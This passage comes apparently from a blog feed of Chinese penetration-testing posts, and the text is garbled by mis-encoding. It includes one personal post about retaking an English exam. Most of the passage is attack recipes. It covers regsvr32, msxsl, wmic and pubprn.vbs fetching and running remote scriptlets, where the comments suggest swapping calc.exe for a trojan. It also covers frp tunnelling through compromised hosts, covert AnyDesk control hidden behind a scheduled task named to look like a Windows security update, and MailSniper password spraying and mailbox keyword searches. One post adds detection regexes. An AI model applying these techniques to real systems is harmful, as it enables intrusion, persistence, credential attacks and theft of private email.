12.rundll32å…¶å®è¿˜æ˜¯ä¾èµ–äºWScript.shellè¿™ä¸ªç»„ä»¶åœ¨è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨JSRatæ¥åšæ¼”ç¤ºï¼ŒJSRatæ˜¯ä¸€ä¸ªå‘½ä»¤å’Œæ§åˆ¶æ¡†æ¶ï¼Œä»…ä¸ºrundll32.exeå’Œregsvr32.exeç”Ÿæˆæ¶æ„ç¨‹åº(é¡¹ç›®åœ°å€ï¼šhttps://github.com/Hood3dRob1n/JSRat-Py.git)ã€‚ 1.å¼€å§‹è¿è¡ŒJSRatï¼Œç›‘å¬æœ¬åœ°8888ç«¯å£ã€‚ ./JSRat.py -i 192.168.0.115 -p 8888 2.é€šè¿‡urlè®¿é—®ï¼Œå¯ä»¥æŸ¥çœ‹åˆ°æ¶æ„ä»£ç ï¼Œå¤åˆ¶ä¸Šé¢ç”Ÿæˆçš„ä»£ç  3.åœ¨å—å®³è€…PCè¿è¡Œè¯¥ä»£ç ï¼Œå°†æˆåŠŸè¿”å›ä¸€ä¸ªä¼šè¯ 13.regsvr32Regsvr32å‘½ä»¤ç”¨äºæ³¨å†ŒCOMç»„ä»¶ï¼Œæ˜¯Windowsç³»ç»Ÿæä¾›çš„ç”¨æ¥å‘ç³»ç»Ÿæ³¨å†Œæ§ä»¶æˆ–è€…å¸è½½æ§ä»¶çš„å‘½ä»¤ï¼Œä»¥å‘½ä»¤è¡Œæ–¹å¼è¿è¡Œ åœ¨ç›®æ ‡æœºä¸Šæ‰§è¡Œï¼š regsvr32.exe /u /n /s /i:http://192.168.28.131:8888/file.sct scrobj.dll # file.sctéœ€è¦æˆ‘ä»¬è‡ªå·±æ¥æ„é€  å¯ä»¥é€šè¿‡è‡ªå·±æ„é€ .sctæ–‡ä»¶ä¸­è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œå»ä¸‹è½½æ‰§è¡Œæˆ‘ä»¬çš„ç¨‹åº(è¿™é‡Œä»¥å¼¹è®¡ç®—å™¨ä¸ºä¾‹)ï¼š &lt;?XML version="1.0"?> &lt;scriptlet> &lt;registration progid="ShortJSRAT" classid="{10001111-0000-0000-0000-0000FEEDACDC}" > &lt;script language="JScript"> &lt;![CDATA[ ps = "cmd.exe /c calc.exe"; new ActiveXObject("WScript.Shell").Run(ps,0,true); ]]> &lt;/script> &lt;/registration> &lt;/scriptlet> 14.MSXSL.EXEmsxsl.exeæ˜¯å¾®è½¯ç”¨äºå‘½ä»¤è¡Œä¸‹å¤„ç†XSLçš„ä¸€ä¸ªç¨‹åºï¼Œæ‰€ä»¥é€šè¿‡ä»–ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡ŒJavaScriptè¿›è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ ä¸‹è½½åœ°å€ä¸ºï¼šhttps://www.microsoft.com/en-us/download/details.aspx?id=21714 msxsl.exe éœ€è¦æ¥å—ä¸¤ä¸ªæ–‡ä»¶ï¼ŒXMLåŠXSLæ–‡ä»¶ï¼Œå¯ä»¥è¿œç¨‹åŠ è½½ï¼Œå…·ä½“æ–¹å¼å¦‚ä¸‹ï¼š msxsl http://192.168.28.128/scripts/demo.xml http://192.168.28.128/scripts/exec.xsl demo.xml &lt;?xml version="1.0"?> &lt;?xml-stylesheet type="text/xsl" href="exec.xsl" ?> &lt;customers> &lt;customer> &lt;name>Microsoft&lt;/name> &lt;/customer> &lt;/customers> exec.xslï¼ˆè¿™é‡Œä»¥å¼¹è®¡ç®—å™¨ä¸ºä¾‹ï¼‰ &lt;?xml version='1.0'?> &lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace"> &lt;msxsl:script language="JScript" implements-prefix="user"> function xml(nodelist) { var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe"); # è¿™é‡Œä¿®æ”¹ä¸ºæˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ return nodelist.nextNode().xml; } &lt;/msxsl:script> &lt;xsl:template match="/"> &lt;xsl:value-of select="user:xml(.)"/> &lt;/xsl:template> &lt;/xsl:stylesheet> 15.pubprn.vbsåœ¨Windows 7ä»¥ä¸Šç‰ˆæœ¬å­˜åœ¨ä¸€ä¸ªåä¸ºPubPrn.vbsçš„å¾®è½¯å·²ç­¾åWSHè„šæœ¬ï¼Œå…¶ä½äºC:\Windows\System32\Printing_Admin_Scripts\en-USï¼Œä»”ç»†è§‚å¯Ÿè¯¥è„šæœ¬å¯ä»¥å‘ç°å…¶æ˜¾ç„¶æ˜¯ç”±ç”¨æˆ·æä¾›è¾“å…¥ï¼ˆé€šè¿‡å‘½ä»¤è¡Œå‚æ•°ï¼‰ï¼Œä¹‹åå†å°†å‚æ•°ä¼ é€’ç»™GetObject() "C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs" 127.0.0.1 script:https://gist.githubusercontent.com/xps/64acdkpodsk4566b04a/raw/a006a4 7e4075785016a62f7e5170ef36f5247cdb/test.sct test.sctï¼ˆå’Œ13ä¸€æ ·ï¼Œè¿™é‡Œä»¥å¼¹è®¡ç®—å™¨ä¸ºä¾‹ï¼‰ &lt;?XML version="1.0"?> &lt;scriptlet> &lt;registration description="Bandit" progid="Bandit" version="1.00" classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}" remotable="true" > &lt;/registration> &lt;script language="JScript"> &lt;![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); ]]> &lt;/script> &lt;/scriptlet> document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>å‘½ä»¤è¡Œä¸‹è½½æ–‡ä»¶</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è¿”æ ¡è€ƒå…­çº§]]></title>
    <url>%2Fposts%2F20779%2F</url>
    <content type="text"><![CDATA[ä»Šå¹´çš„å…­çº§è€ƒè¯•ï¼Œä¹Ÿå› ä¸ºç–«æƒ…åŸå› æ¨è¿Ÿåˆ°äº†ä¹æœˆä»½ï¼Œæ•…2020å±Šæ¯•ä¸šç”Ÿä¹Ÿæœ‰äº†ä¸€æ¬¡æ¯•ä¸šä¹‹åå†æ¬¡è¿›å…¥åˆ°æ ¡å›­çš„ä¸€æ¬¡å°æœºä¼šã€‚ ä¸Šåˆç­‰å¾…æœ‹å‹çš„åˆ°æ¥ï¼Œç„¶åä¸€èµ·å¬äº†å¬å¬åŠ›ï¼ŒèƒŒäº†èƒŒä½œæ–‡ï¼Œç„¶åä¸­åˆä¸€èµ·å»åƒäº†éº»è¾£æ‹Œã€‚å¯èƒ½ä¸­åˆåœ¨å®¶ç¡çš„æ—¶é—´å¤ªé•¿ï¼Œä»¥è‡´äºåŒ†åŒ†å¿™å¿™èµ¶ç€å»è€ƒåœºï¼Œä¸‹åˆä¸‰ç‚¹å¼€è€ƒï¼Œä¸¤ç‚¹å››åäº”å·¦å³æˆ‘æ‰è¿›åˆ°å­¦æ ¡åŒ—é—¨ï¼ŒçœŸæ˜¯å¤±ç®—å•Šã€‚åŒ†å¿™è¿›åˆ°è€ƒåœºï¼Œå¯ç®—æ˜¯èµ¶ä¸Šäº†ã€‚ å¼€è€ƒäº†ï¼Œå‘ä¸‹ç­”é¢˜å¡ä¹‹åå†™åå­—ï¼Œå¿½ç„¶å‘ç°è‡ªå·±æ‹¿èµ·ç¬”ä¹‹åç”±äºå¤ªé•¿æ—¶é—´ä¸åŠ¨ç¬”ï¼Œéƒ½å¿«ä¸ä¼šå†™å­—äº†ğŸ˜„ã€‚çœç•¥ä¸€å †è¿‡ç¨‹â€¦ â€¦è™½ç„¶æ²¡å¥½å¥½å¤‡è€ƒï¼Œä½†æ˜¯ç­”é¢˜çš„è¿‡ç¨‹å´å¾ˆè®¤çœŸï¼Œä¸¤ä¸ªå¤šå°æ—¶ä¸€ä¸‹å°±è¿‡å»äº†ï¼Œç”šè‡³æ„Ÿè§‰æ—¶é—´ä¸å¤Ÿç”¨ï¼Œä¹Ÿè®¸æ˜¯å› ä¸ºè¿™æ˜¯æœ€åä¸€æ¬¡ååœ¨è¿™ä¸ªå­¦æ ¡é‡Œé¢è€ƒè¯•äº†å§ã€‚è€ƒè¯•è¿‡ç¨‹ä¸­ï¼Œçª—å¤–æ˜¯ç¯®çƒåœºä¸Šæ‰“ç¯®çƒçš„å£°éŸ³ï¼Œä¹…è¿çš„å£°éŸ³ï¼Œè®©äººæ„Ÿåˆ°å¿ƒå®‰è€Œæ€€å¿µã€‚ è€ƒå®Œä¹‹åï¼Œèµ°å‡ºå°šå¾·æ¥¼ï¼Œå‚æ™šæ—¶åˆ†ï¼Œæ¸©åº¦åˆšåˆšå¥½ï¼Œé˜³å…‰åˆšåˆšå¥½ï¼Œæ—è¾¹èµ°è¿‡å»çš„äººè®¨è®ºç€åˆšè€ƒå®Œçš„ç¿»è¯‘å’Œä½œæ–‡What is worth doing is worth doing wellï¼Œå¥‡è¿¹èˆ¬æ„Ÿè§‰è‡ªå·±ä»¿ä½›åˆé‡æ–°å›åˆ°äº†å¤§å­¦ä¸€æ ·ï¼Œé‚£æ˜¯ä¸€ç§æ¯•ä¸šä¹‹åçš„å‡ ä¸ªæœˆæ¥ä»æœªæœ‰è¿‡çš„å¿ƒå®‰ã€‚ æˆ‘æœ‰ä¸€ç§æƒ³è¦å‡å­¦é‡æ–°å›åˆ°æˆ‘çš„å¸ˆèŒƒæ ¡å›­çš„å†²åŠ¨ã€‚ ä¸è¿‡ç”±äºæ™šä¸Šå€¼å¤œç­ï¼Œæ‰€ä»¥æ²¡åšè¿‡å¤šåœç•™ï¼Œåªèƒ½å’Œå­¦å¼Ÿåœ¨é£Ÿå ‚åŒ†åŒ†åƒå®Œé¥­ï¼Œæ‰“è½¦å›é¡¹ç›®ä¸Šäº†ã€‚ æ¯ä¸ªäººçš„æ ¡å›­ç”Ÿæ´»éƒ½å€¼å¾—æ€€å¿µï¼Œæ¯ä¸ªäººçš„é’æ˜¥éƒ½å€¼å¾—å›å¿†ã€‚ ä¸‹é¢æ˜¯ä¸€äº›å½“å¤©æ‹çš„ç…§ç‰‡ï¼š document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>ç”Ÿæ´»</category>
      </categories>
      <tags>
        <tag>ç¢ç¢å¿µ</tag>
        <tag>è¿”æ ¡çš„è¯±æƒ‘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[frp]]></title>
    <url>%2Fposts%2F23493%2F</url>
    <content type="text"><![CDATA[ä¸‹è½½åœ°å€ï¼šhttps://github.com/fatedier/frp.git è·¨å¹³å°ï¼Œæ ¹æ®è‡ªå·±æƒ…å†µé€‰æ‹©ä½¿ç”¨ é…ç½®æ–‡ä»¶æœåŠ¡ç«¯ å®¢æˆ·ç«¯ éƒ¨ç½²æœåŠ¡ç«¯è¿æ¥åˆ°vpsä¸Šï¼Œåå°å¯åŠ¨æœåŠ¡ç«¯ nohup ./frps -c frps.int &amp; jobs -l cat frps.log å®¢æˆ·ç«¯å°†frpc.exeä¸frpc.iniä¼ åˆ°ç›®æ ‡æœºçš„åŒä¸€ç›®å½•ä¸‹ï¼Œç›´æ¥è¿è¡Œ frpc.exe -c frpc.int å½“frpå®¢æˆ·ç«¯å¯åŠ¨åï¼Œæ˜¯å¦æˆåŠŸè¿æ¥ï¼Œéƒ½ä¼šåœ¨frpæœåŠ¡ç«¯æ—¥å¿—ä¸­æŸ¥çœ‹åˆ° ä½†å¦‚æœç›´æ¥åœ¨ç›®æ ‡æœºçš„Beaconä¸­å¯åŠ¨frpå®¢æˆ·ç«¯ï¼Œä¼šæŒç»­æœ‰æ—¥å¿—è¾“å‡ºï¼Œå¹¶å¹²æ‰°è¯¥pidä¸‹çš„å…¶ä»–æ“ä½œï¼Œ æ‰€ä»¥å¯ç»“åˆexecuteåœ¨ç›®æ ‡æœºæ— è¾“å‡ºæ‰§è¡Œç¨‹åºã€‚ sleep 10 execute c:/frpc.exe -c c:/frpc.ini shell netstat -ano |findstr 7007 WindowsWindowsä¸­å¯ç»“åˆProxifierã€SSTapç­‰å·¥å…·ï¼Œå¯è®¾ç½®socks5å£ä»¤ï¼Œä»¥æ­¤è¾¾åˆ°ç”¨windowsæ¸—é€å·¥å…·æ¨ªå‘ç©¿é€çš„æ•ˆæœã€‚ Frpçš„ç”¨æ³•æ¯”è¾ƒçµæ´»ä¸”è¿è¡Œç¨³å®šã€‚å¦‚å¯å°†frpæœåŠ¡ç«¯æŒ‚åœ¨â€è‚‰é¸¡â€ä¸Šï¼Œä»¥è¾¾åˆ°éšè”½æ€§ï¼Œä¹Ÿå¯å°†å®¢æˆ·ç«¯åšæˆæœåŠ¡è‡ªå¯çš„å½¢å¼ç­‰ï¼Œå®æˆ˜ä¸­å¯è‡ªç”±å‘æŒ¥ã€‚ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>frp</tag>
        <tag>å†…ç½‘ç©¿é€</tag>
        <tag>ç«¯å£è½¬å‘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSL Script Processing]]></title>
    <url>%2Fposts%2F45834%2F</url>
    <content type="text"><![CDATA[XSLæ˜¯æŒ‡æ‰©å±•æ ·å¼è¡¨è¯­è¨€(Extension Stylesheet Language) msxsl.exeæ˜¯å¾®è½¯ç”¨äºå‘½ä»¤è¡Œä¸‹å¤„ç†XSLçš„ä¸€ä¸ªç¨‹åºï¼Œæ‰€ä»¥é€šè¿‡ä»–ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡ŒJavaScriptè¿›è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä¸‹è½½åœ°å€ï¼šhttps://www.microsoft.com/en-us/download/details.aspx?id=21714 æ‰§è¡Œè¯¥å·¥å…·éœ€è¦ç”¨åˆ°2ä¸ªæ–‡ä»¶ï¼Œåˆ†åˆ«ä¸ºXMLåŠXSLæ–‡ä»¶ï¼Œmsxslå‘½ä»¤è¡Œæ¥å—å‚æ•°å½¢å¼å¦‚ä¸‹ï¼š msxsl.exe {xmlfile} {xslfile} # è°ƒç”¨æ–‡ä»¶å†…çš„å‘½ä»¤ msxsl.exe {xslfile} {xslfile} å‘½ä»¤æ‰§è¡ŒæŠ€æœ¯å¤ç°ï¼ˆMSXSL.EXEï¼‰æœ¬åœ°æ‰§è¡Œtest.xml &lt;?xml version="1.0"?> &lt;?xml-stylesheet type="text/xsl" href="exec.xsl" ?> &lt;customers> &lt;customer> &lt;name>Microsoft&lt;/name> &lt;/customer> &lt;/customers> exec.xsl &lt;?xml version="1.0"?> &lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace"> &lt;msxsl:script language="JScript" implements-prefix="user"> function xml(nodelist) { var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe"); //è¿™é‡Œå¯ä»¥æ”¹é€ ä¸ºæ‰§è¡Œä½ çš„æœ¨é©¬æ–‡ä»¶å¦‚ï¼š // var r = new ActiveXObject("WScript.Shell").Run("cmd /k cd c:\ &amp; shell.exe"); return nodelist.nextNode().xml; } &lt;/msxsl:script> &lt;xsl:template match="/"> &lt;xsl:value-of select="user:xml(.)"/> &lt;/xsl:template> &lt;/xsl:stylesheet> æ‰§è¡Œ msxsl.exe test.xml exec.xsl è¿œç¨‹æ‰§è¡Œmsxsl.exe https://raw.githubusercontent.com/xx/master/test.xml https://raw.githubusercontent.com/xx/master/exec.xsl æŠ€æœ¯å¤ç°ï¼ˆWMIC.EXEï¼‰wmicå¯é€šè¿‡å¦‚ä¸‹æ–¹å¼æ‰§è¡Œxslå†…çš„æ¶æ„ä»£ç  wmic.exe {wmic_cmd} /FORMAT:{xsl_file} æœ¬åœ°æ‰§è¡Œwmic.exe process get name /format:exec.xsl è¿œç¨‹æ‰§è¡Œwmic.exe process get name /format:http:/www.xxx.com/exec.xsl https://www.cnblogs.com/backlion/p/10489916.html å¨èƒæ£€æµ‹æ•°æ®æºï¼š è¿›ç¨‹ç›‘è§†ã€è¿›ç¨‹å‘½ä»¤è¡Œå‚æ•°ã€ç½‘ç»œçš„è¿›ç¨‹ä½¿ç”¨ã€DLLç›‘è§† msxsl.exeè¿›ç¨‹ç‰¹å¾ï¼š # å½“msxsl.exeä½œä¸ºçˆ¶è¿›ç¨‹åˆ›å»ºå…¶ä»–è¿›ç¨‹æ—¶è§†ä¸ºå¯ç–‘ ParentImage regex '^.*msxsl\.exe$' åŠ è½½é¡¹ç‰¹å¾ï¼š #å½“msxsl.exeåŠ è½½jscript.dllæ—¶è§†ä¸ºå¯ç–‘ Image regex '^.*msxsl\.exe$' AND ImageLoaded contains 'jscript.dll' wmic.exeåŠ è½½é¡¹ç‰¹å¾ #å½“wmic.exeåŠ è½½jscript.dllæ—¶è§†ä¸ºå¯ç–‘ Image regex '^.*wmic\.exe$' AND ImageLoaded contains 'jscript.dll' é€šè¿‡MSXSLæ–¹å¼è¿›è¡Œé±¼å‰å¼ç½‘ç»œé’“é±¼æœ‰å¹´å¤´çš„å‚è€ƒæ–‡ç« ï¼šhttps://www.anquanke.com/post/id/159316 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>XSL Script Processing</tag>
        <tag>MSXSL.exe</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨anydeskåšè¿œæ§]]></title>
    <url>%2Fposts%2F15621%2F</url>
    <content type="text"><![CDATA[anydeskæ˜¯ç±»ä¼¼teamviewerçš„è¿œç¨‹ç®¡ç†è½¯ä»¶ï¼Œä½†æ˜¯ä»–ä¸ç”¨å®‰è£…ä¸”ä½“ç§¯å° åœºæ™¯ä¸¾ä¾‹ æœ‰äº‘é”ï¼ŒæŠ¤å«ç¥ç­‰ç¦æ­¢3389ç™»å½•æ—¶ ç±»ä¼¼é˜¿é‡Œäº‘è¿™ç§ï¼Œç™»å½•3389ä¼šæŠ¥è­¦ è¿æ¥å†…ç½‘ä¸­å¯ä»¥å‡ºç½‘çš„windowsæœºå™¨ æ³¨æ„äº‹é¡¹ å¯åŠ¨anydeskçš„æƒé™éœ€è¦æ¡Œé¢ç”¨æˆ·æƒé™ï¼Œæ¯”å¦‚ï¼ŒIISåšä¸­é—´ä»¶çš„ç¯å¢ƒä¸­ï¼Œæ‹¿åˆ°äº†webshellä¸€èˆ¬éƒ½æ˜¯æ²¡æœ‰æ¡Œé¢ç”¨æˆ·æƒé™çš„ï¼Œå¦‚æœå¯åŠ¨anydeskä¸ä¼šæˆåŠŸ å¯åŠ¨anydeskæ—¶æ¡Œé¢ä¸èƒ½è¢«æ³¨é”€ æœ‰å¯èƒ½è¿æ¥ä¸Šå»æ˜¯é»‘å±ï¼Œè¿™ä¸ªæ˜¯å› ä¸ºè¯¥æ¡Œé¢ç”¨æˆ·é€€å‡ºè¿œç¨‹æ¡Œé¢ä½†æ²¡æœ‰æ³¨é”€ï¼Œæ­¤æ—¶ï¼Œé™¤éèƒ½ç”¨winlogonå¯åŠ¨anydeskï¼Œå¦åˆ™æ²¡æ³•ä½¿ç”¨å±å¹• ä½¿ç”¨æ–¹æ³• ä¹ æƒ¯æ€§çš„ä½¿ç”¨https://www.virustotal.com/guiæ‰«æä¸€ä¸‹ å‡è®¾è·å–åˆ°äº†ç›®æ ‡ç³»ç»Ÿçš„ä¸€ä¸ªmsfçš„shell `bash ä¸‹è½½anydeskåˆ°ä¸€ä¸ªå…¬å…±ç›®å½•ä¸‹(New-Object System.Net.WebClient).DownloadFile(â€œhttps://download.anydesk.com/AnyDesk.exe?_ga=2.176752485.1141763109.1599703967-925913843.1599703967","C:\Users\Public\Desktop\anydesk.exe") ç¡®å®šæœ‰å“ªäº›ç”¨æˆ·æ­£åœ¨ä½¿ç”¨æ¡Œé¢???(((Get-WmiObject -Class Win32_Process -Filter â€˜Name=â€explorer.exeâ€â€˜).GetOwner().)) å¯åŠ¨ä¸€ä¸ªè®¡åˆ’ä»»åŠ¡ï¼Œå¯åŠ¨çš„ç”¨æˆ·ä¸ºä¸Šä¸ªæ­¥éª¤é€‰ä¸­çš„ç”¨æˆ·???schtasks /Create /TN Windwos_Security_Update /SC monthly /tr â€œc:.â€¦..â€ å…ˆæ‰§è¡Œä¸€æ¬¡è®¡åˆ’ä»»åŠ¡ï¼Œç”Ÿæˆé…ç½®æ–‡ä»¶schtasks /run /tn Windwos_Security_Update ç­‰å¾…å‡ ç§’ï¼Œç­‰anydeskæˆåŠŸè¿æ¥åˆ°ç½‘ç»œï¼Œå†æŠŠanydeskè¿›ç¨‹æ€æ‰ï¼Œdirçœ‹ç”¨æˆ·ä¸‹é¢æ˜¯å¦ç”Ÿæˆé…ç½®æ–‡ä»¶ï¼Œç„¶åå†service.confé‡Œé¢çš„æ·»åŠ å¯†ç (AnyDeskGetAccess) æŸ¥çœ‹anydeskIDå¹¶å¯åŠ¨anydeskä¸éœ€è¦åˆ°ç›®æ ‡æœºå™¨ä¸Šç‚¹å‡»æ¥å—ï¼Œè¾“å…¥å¯†ç å³å¯åˆ†äº«ä¸€ä¸ªé«˜æƒé™webshellä¸‹å¯ä»¥ä½¿ç”¨çš„powershellè„šæœ¬ ` document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>è¿œæ§</tag>
        <tag>anydesk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mailsniper.ps1]]></title>
    <url>%2Fposts%2F27598%2F</url>
    <content type="text"><![CDATA[ä¸‹è½½åœ°å€ï¼šhttps://github.com/dafthack/MailSniper.git mailsniper.ps1è·å–outlookæ‰€æœ‰è”ç³»äºº æ”¶é›†é‚®ç®±ï¼Œä¸ºåç»­çˆ†ç ´å‡†å¤‡ å‰ææŒæ¡å…¶ä¸­ä¸€ä¸ªç”¨æˆ·é‚®ç®±çš„è´¦æˆ·å¯†ç ï¼Œå¹¶å¯ä»¥ç™»å½•outlook åˆ©ç”¨å‘½ä»¤æ ¼å¼ # åœ¨åŸŸå†…æœºå™¨ä¸Šæ‰§è¡Œ powershell -exec bypass Import-Module .\MailSniper.ps1 Get-GlobalAddressList -ExchHostname outlookåœ°å€ -UserName åŸŸå\åŸŸç”¨æˆ·å -Password å·²çŸ¥çš„é‚®ç®±å¯†ç  -OutFile å¯¼å‡ºç»“æœ.txt 1.ç›®æ ‡outlookæ­å»ºåœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Š ExchHostnameæŒ‡å‘è‡ªå·±çš„é‚®ç®±æœåŠ¡å™¨åœ°å€å³å¯ 2.ç›®æ ‡outlookåœ¨office365ä¸­ ä¸€æ ·çš„é“ç†ï¼Œåªä¸è¿‡æŠŠExchHostnameæŒ‡å‘outlook.office365.comå³å¯ï¼Œusernameä½¿ç”¨å®Œæ•´çš„é‚®ç®±ï¼Œè€Œä¸ä»…ä»…æ˜¯ç”¨æˆ·åã€‚ çˆ†ç ´exchangeï¼ˆæŒ‡å®šå¯†ç çˆ†ç ´é‚®ç®±ï¼‰powershell -exec bypass Import-Module .\MailSniper.ps1 Invoke-PasswordSprayEWS -ExchHostname owa2013.rootkit.org -UserList .\users.txt -Password Admin12345 -ExchangeVersion Exchange2013_SP1 # -ExchHostnameï¼šping -a exchangeæœåŠ¡å™¨ip -> å¾—åˆ°ä¸»æœºå -> ä¸»æœºåæ‹¼æ¥åŸŸåï¼ˆå¦‚ï¼šowa2013.rootkit.orgï¼‰ # -ExchangeVersionï¼šè‹¥ä¸çŸ¥é“å¯å…ˆä¸æŒ‡å®š MailSniperæ£€ç´¢é‚®ä»¶å†…å®¹MailsniperåŒ…å«ä¸¤ä¸ªä¸»è¦çš„cmdletï¼Œåˆ†åˆ«æ˜¯Invoke-SelfSearchå’ŒInvoke-GlobalMailSearchï¼Œç”¨äºæ£€ç´¢é‚®ä»¶ä¸­çš„å…³é”®å­—ã€‚ ## æŸ¥æ‰¾å½“å‰ç”¨æˆ·çš„Exchangeé‚®ç®±æ•°æ® Invoke-SelfSearch -Mailbox zhangsan@fb.com -Terms *æœºå¯†* -Folder æ”¶ä»¶ç®± -ExchangeVersion Exchange2013_SP1 # æŸ¥æ‰¾é‚®ä»¶å†…å®¹ä¸­åŒ…å«pwnå­—ç¬¦ä¸²çš„é‚®ä»¶ï¼Œ-Folderå‚æ•°å¯ä»¥æŒ‡å®šè¦æœç´¢çš„æ–‡ä»¶å¤¹ï¼Œé»˜è®¤æ˜¯inboxï¼Œä½¿ç”¨æ—¶æœ€å¥½æŒ‡å®šè¦æœç´¢çš„æ–‡ä»¶å¤¹åç§°ï¼ˆæˆ–è€…æŒ‡å®šallæŸ¥æ‰¾æ‰€æœ‰æ–‡ä»¶ï¼‰ï¼Œå› ä¸ºè¯¥å·¥å…·æ˜¯å¤–å›½äººå†™çš„ï¼ŒExchangeè‹±æ–‡ç‰ˆæ”¶ä»¶ç®±ä¸ºInboxï¼Œå½“Exchangeä½¿ç”¨ä¸­æ–‡ç‰ˆæ—¶æ”¶ä»¶ç®±ä¸ä¸ºè‹±æ–‡åï¼Œé»˜è®¤æŸ¥æ‰¾inboxæ–‡ä»¶å¤¹ä¼šå› æ‰¾ä¸åˆ°è¯¥æ–‡ä»¶è€Œå‡ºé”™ ## æŸ¥æ‰¾æ‰€æœ‰ç”¨æˆ·çš„Exchangeé‚®ç®±æ•°æ® Invoke-GlobalMailSearch -ImpersonationAccount zhangsan -ExchHostname test2k12 -AdminUserName fb.com\administrator -ExchangeVersion Exchange2013_SP1 -Term "*å†…éƒ¨é‚®ä»¶*" -Folder æ”¶ä»¶ç®± # åˆ©ç”¨administratorç®¡ç†å‘˜ç”¨æˆ·ä¸ºæ™®é€šç”¨æˆ·zhangsanåˆ†é…ApplicationImpersonationè§’è‰²ï¼Œæ£€ç´¢æ‰€æœ‰é‚®ç®±ç”¨æˆ·çš„é‚®ä»¶ä¸­ï¼ŒåŒ…æ‹¬â€œå†…éƒ¨é‚®ä»¶â€å…³é”®å­—çš„å†…å®¹ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>mailsniper.ps1</tag>
        <tag>ä¿¡æ¯æœé›†</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¼€æºæƒ…æŠ¥ä¿¡æ¯æœç´¢(OSINT)]]></title>
    <url>%2Fposts%2F37%2F</url>
    <content type="text"><![CDATA[æœç´¢å¼•æ“è¯­æ³• ç™¾åº¦ è°·æ­Œ å¿…åº” åœ¨çº¿æ¥å£ http://cebaidu.com/index/getRelatedSites?site_address=baidu.com http://www.webscan.cc/ http://sbd.ximcx.cn/ https://censysio/certificates?q=example.com https://crt.sh/?q=%25example.com https://github.com/cOny1WorkScripts/tree/master/get-subdomain-from-baidu https://dnsdumpster.com/ https://ww.threatcrowd.org/searchApi/v2/domain/report/?domain=baidu.com https://findsubdomains.com/ https://dnslytics.com/search?q=www.baidu.com https://pentest-tools.com/information-gathering/find-subdomains-of-domain https://viewdns.info/ https://www.ipneighbour.com#/lookup/114.114.114.114 https://securitytrails.com/list/apex_domain/baidu.com https://url.fht.im/ http://api.hackertarget.com/hostsearch/?q=baidu.com http://ww.yunseecn/finger.html 